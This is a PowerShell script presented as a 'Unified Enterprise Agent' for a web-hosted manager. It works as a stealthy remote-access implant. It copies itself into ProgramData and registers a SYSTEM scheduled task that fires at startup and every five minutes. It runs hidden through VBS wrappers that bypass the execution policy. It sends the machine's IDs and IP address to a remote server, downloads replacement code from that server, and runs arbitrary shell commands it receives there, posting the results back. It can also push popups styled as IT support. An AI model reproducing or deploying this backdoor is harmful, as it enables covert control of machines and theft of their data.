param(
    $ServerUrl = "https://unified-manager.vercel.app"
)

# Unified Enterprise Agent (UEA)
# Version: 1.4.7
# Description: Lightweight persistence and telemetry agent for Unified Manager.

$ErrorActionPreference = "Stop"
$InstallDir = "$env:ProgramData\UnifiedAgent"
$LogFile = "$InstallDir\agent.log"
$ScriptPath = "$InstallDir\unified-agent.ps1"
$ConfigPath = "$InstallDir\config.json"

function Log-Message {
    param($Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Line = "[$Timestamp] $Message"
    # Write-Host $Line # Silence console for absolute stealth
    if ($LogFile) {
        try {
            if (-not (Test-Path (Split-Path $LogFile))) { 
                New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force | Out-Null
            }
            $Line | Out-File -FilePath $LogFile -Append -ErrorAction Stop
        } catch {}
    }
}

function Get-RobustId {
    param($Type)
    try {
        if ($Type -eq "UUID") {
            $val = (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
            if ($val -and $val -ne "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF") { return $val }
        } else {
            $val = (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber
            if ($val -and $val -notmatch "To be filled|Default|None") { return $val }
        }
    } catch {}
    return "$($env:COMPUTERNAME)-$(Get-Random)"
}

function Install-StealthAgent {
    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $IsAdmin) { return }

    Log-Message "Installing/Repairing Stealth Persistence..."
    if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
    
    # Save Config
    $Config = @{ ServerUrl = $ServerUrl; Version = "1.4.7" }
    $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force

    # Stealth Wrapper (VBS)
    $VbsMainPath = "$InstallDir\uea_stealth.vbs"
    $VbsMainCode = "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False"
    $VbsMainCode | Out-File -FilePath $VbsMainPath -Force -Encoding ascii

    # Scheduled Task (SYSTEM)
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsMainPath`""
    $Trigger1 = New-ScheduledTaskTrigger -AtStartup
    $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    
    # Unregister legacy tasks
    Unregister-ScheduledTask -TaskName "UnifiedEnterpriseAgent" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    Register-ScheduledTask -TaskName "UEA_Persistence" -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
    Log-Message "Stealth Persistence Installed."
}

try {
    $AgentId = Get-RobustId "UUID"
    $SerialNumber = Get-RobustId "Serial"
    $Version = "1.4.7"
    
    # Initial Install Check
    $TaskExists = Get-ScheduledTask -TaskName "UEA_Persistence" -ErrorAction SilentlyContinue
    if (($PSCommandPath -ne $ScriptPath) -or (-not $TaskExists)) {
        if ($PSCommandPath -and $PSCommandPath -ne $ScriptPath) {
            if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
            Copy-Item -Path $PSCommandPath -Destination $ScriptPath -Force
        }
        Install-StealthAgent
    }

    # Load Config fallback
    if (Test-Path $ConfigPath) {
        $SavedConfig = Get-Content $ConfigPath | ConvertFrom-Json
        if ($ServerUrl -like "*vercel.app") { $ServerUrl = $SavedConfig.ServerUrl }
    }

    Log-Message "Agent v$Version Started. ID: $AgentId"

    while ($true) {
        try {
            $Response = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body (ConvertTo-Json @{
                agentId = $AgentId
                serialNumber = $SerialNumber
                version = $Version
                status = "online"
                deviceName = $env:COMPUTERNAME
                localIp = try { (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPv4Address -notlike "169.254*" } | Select-Object -First 1).IPv4Address } catch { "Unknown" }
            }) -ContentType "application/json"

            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]$Version)) {
                Log-Message "Upgrade available: $($Response.latestVersion). Downloading..."
                Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing
                Install-StealthAgent
                
                # Restart via VBS stealth
                $VbsRestart = "$InstallDir\restart.vbs"
                "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False" | Out-File -FilePath $VbsRestart -Force -Encoding ascii
                Start-Process "wscript.exe" -ArgumentList "`"$VbsRestart`""
                Stop-Process -Id $PID
            }

            foreach ($cmd in $Response.commands) {
                try {
                    $Result = ""
                    if ($cmd.type -eq "Message") {
                        $msg = $cmd.payload.message
                        $HtaPath = "$InstallDir\support.hta"
                        $HtaCode = "<html><head><title>IT Support</title><hta:application border='none' caption='no' showintaskbar='yes' singleinstance='yes' sysmenu='no' /><style>body{font-family:'Segoe UI';background:#0f172a;color:white;margin:0;padding:20px;border:1px solid #1e293b;} .btn{background:#0284c7;color:white;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;float:right;}</style><script language='vbscript'>Sub Window_OnLoad: window.resizeTo 450, 200: window.moveTo (screen.width-450)/2, (screen.height-200)/2: End Sub: Sub Ack: CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -Command Invoke-RestMethod -Method Post -Uri '$ServerUrl/api/agent/result' -Body (@{agentId='$AgentId';type='Message-Ack';data='HTA-OK'} | ConvertTo-Json)`", 0, False: window.close: End Sub</script></head><body><h3 style='color:#38bdf8;margin-top:0;'>Equinox IT Support</h3><p>$msg</p><button class='btn' onclick='Ack()'>Dismiss</button></body></html>"
                        $HtaCode | Out-File -FilePath $HtaPath -Force -Encoding utf8
                        
                        $ActiveUser = (Get-CimInstance Win32_ComputerSystem).UserName
                        if ($ActiveUser) {
                            $TaskName = "UEA_Popup_$(Get-Random)"
                            $Action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "`"$HtaPath`""
                            $Principal = New-ScheduledTaskPrincipal -UserId $ActiveUser -LogonType Interactive
                            Register-ScheduledTask -TaskName $TaskName -Action $Action -Principal $Principal -Force | Out-Null
                            Start-ScheduledTask -TaskName $TaskName | Out-Null
                            Start-Sleep -Seconds 5
                            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
                            $Result = "Message delivered via HTA to $ActiveUser"
                        }
                    } elseif ($cmd.type -eq "shell") {
                        $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd.payload.command 2>&1 | Out-String
                    }

                    if ($Result) {
                        Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/result" -Body (ConvertTo-Json @{ agentId = $AgentId; commandId = $cmd.id; result = $Result }) -ContentType "application/json"
                    }
                } catch { Log-Message "Command Error: $($_.Exception.Message)" }
            }
        } catch { Log-Message "Heartbeat failed." }
        Start-Sleep -Seconds 3
    }
} catch { Log-Message "Fatal Error: $($_.Exception.Message)" }
